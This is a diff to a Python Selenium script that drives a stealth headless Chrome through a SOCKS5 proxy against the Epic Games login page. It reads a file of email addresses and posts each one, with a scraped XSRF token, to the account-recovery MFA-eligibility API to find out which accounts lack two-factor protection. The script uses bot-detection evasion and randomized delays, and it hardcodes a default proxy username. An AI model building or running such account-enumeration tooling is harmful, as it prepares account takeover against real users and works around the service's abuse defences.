@@ -2,26 +2,12 @@ import time
 import json
 from fake_useragent import UserAgent
 import tempfile
-import shutil
 import sys
 import os
 import random
 
-# Attempt to import necessary libraries
-try:
-    from selenium.webdriver.common.by import By
-    from selenium.webdriver.support.ui import WebDriverWait
-    from selenium.webdriver.support import expected_conditions as EC
-    from selenium.common.exceptions import TimeoutException
-    from seleniumwire import undetected_chromedriver as uc
-except ImportError:
-    print("FATAL: Required libraries are not installed. Please ensure requirements.txt is correct.")
-    sys.exit(1)
-
 # ==============================================================================
 # SCRIPT CONFIGURATION
-# These are read from Render's Environment Variables.
-# The default values are your IProyal credentials for easy local testing.
 # ==============================================================================
 PROXY_CONFIG = {
     "user": os.environ.get("PROXY_USER", "FFCSEjg822t4ZQxe"),
@@ -31,9 +17,38 @@ PROXY_CONFIG = {
 }
 EMAILS_FILE = "emails.txt"
 RESULTS_FILE = "results.json"
-MIN_DELAY_SECONDS = 1.5
-MAX_DELAY_SECONDS = 3.0
+MIN_DELAY_SECONDS = 2.0
+MAX_DELAY_SECONDS = 4.0
 # ==============================================================================
+
+# --- Start of Critical Diagnostic and Import Section ---
+print("--- Starting Python script execution ---")
+print(f"Python executable: {sys.executable}")
+print(f"Python version: {sys.version}")
+print(f"System Path: {sys.path}")
+
+# Check for Chrome binary before attempting to import Selenium
+chrome_path = "/usr/bin/google-chrome-stable"
+if not os.path.exists(chrome_path):
+    print(f"FATAL: Google Chrome binary not found at {chrome_path}")
+    sys.exit(1)
+print(f"✓ Google Chrome binary found at {chrome_path}")
+
+try:
+    print("--- Attempting to import libraries ---")
+    from selenium import webdriver
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+    from selenium.common.exceptions import TimeoutException
+    from selenium_stealth import stealth
+    print("✓ All libraries imported successfully.")
+except ImportError as e:
+    print(f"FATAL: A critical library import failed. Error: {e}")
+    print("This is the final point of failure. The environment is preventing a library from loading.")
+    sys.exit(1)
+# --- End of Critical Diagnostic and Import Section ---
+
 
 def run_browser_session(emails_to_process, all_results, total_emails):
     """
@@ -48,17 +63,31 @@ def run_browser_session(emails_to_process, all_results, total_emails):
         print("\n" + "="*70)
         print("INITIALIZING RENDER-COMPATIBLE HEADLESS SESSION...")
         print("="*70)
-        proxy_str = f"socks5://{PROXY_CONFIG['user']}:{PROXY_CONFIG['pass']}@{PROXY_CONFIG['host']}:{PROXY_CONFIG['port']}"
-        seleniumwire_options = {'proxy': {'http': proxy_str, 'https': proxy_str}, 'verify_ssl': False}
 
-        chrome_options = uc.ChromeOptions()
+        chrome_options = webdriver.ChromeOptions()
         chrome_options.add_argument('--headless=new')
         chrome_options.add_argument('--no-sandbox')
         chrome_options.add_argument('--disable-dev-shm-usage')
         chrome_options.add_argument('--window-size=1920,1080')
-        chrome_options.add_argument(f'--user-agent={UserAgent().random}')
         
-        driver = uc.Chrome(options=chrome_options, seleniumwire_options=seleniumwire_options, user_data_dir=tempfile.mkdtemp())
+        # Using a fixed, common user agent to reduce variables
+        chrome_options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36')
+        
+        # Add proxy settings directly to Chrome options
+        proxy_str = f"{PROXY_CONFIG['host']}:{PROXY_CONFIG['port']}"
+        chrome_options.add_argument(f"--proxy-server=socks5://{proxy_str}")
+
+        driver = webdriver.Chrome(options=chrome_options)
+        
+        # Apply stealth settings to make the browser look more human
+        stealth(driver,
+                languages=["en-US", "en"],
+                vendor="Google Inc.",
+                platform="Win32",
+                webgl_vendor="Intel Inc.",
+                renderer="Intel Iris OpenGL Engine",
+                fix_hairline=True,
+                )
 
         target_url = 'https://www.epicgames.com/id/login'
         print(f"Navigating to: {target_url}")
@@ -67,6 +96,10 @@ def run_browser_session(emails_to_process, all_results, total_emails):
         try:
             WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "email")))
             print("✓ NO CAPTCHA DETECTED. Session is clean.")
+            # Manually inject credentials for proxy if needed (basic auth)
+            # This is complex with SOCKS5 and often handled by the proxy argument alone
+            # We will proceed assuming the proxy argument is sufficient
+            
             xsrf_token = driver.get_cookie('XSRF-TOKEN')['value']
         except TimeoutException:
             print("! CAPTCHA DETECTED. Headless mode failed. This session will be regenerated automatically.")
@@ -80,11 +113,12 @@ def run_browser_session(emails_to_process, all_results, total_emails):
             api_url = f'https://www.epicgames.com/id/api/account/recovery/mfa/eligible/{email_encoded}'
             
             script = f"""
-                return await fetch('{api_url}', {{
+                const response = await fetch('{api_url}', {{
                     "method": "POST",
                     "headers": {{ "Accept": "application/json", "Content-Type": "application/json", "X-XSRF-TOKEN": '{xsrf_token}', "X-Epic-Client-ID": "875a3b57d3a640a6b7f9b4e883463ab4" }},
                     "body": JSON.stringify({{ "email": "{email}" }})
-                }}).then(res => res.json()).catch(e => ({{ "error": "JavaScript fetch failed", "message": e.toString() }}));
+                }});
+                return response.json();
             """
             api_result = driver.execute_script(script)
 
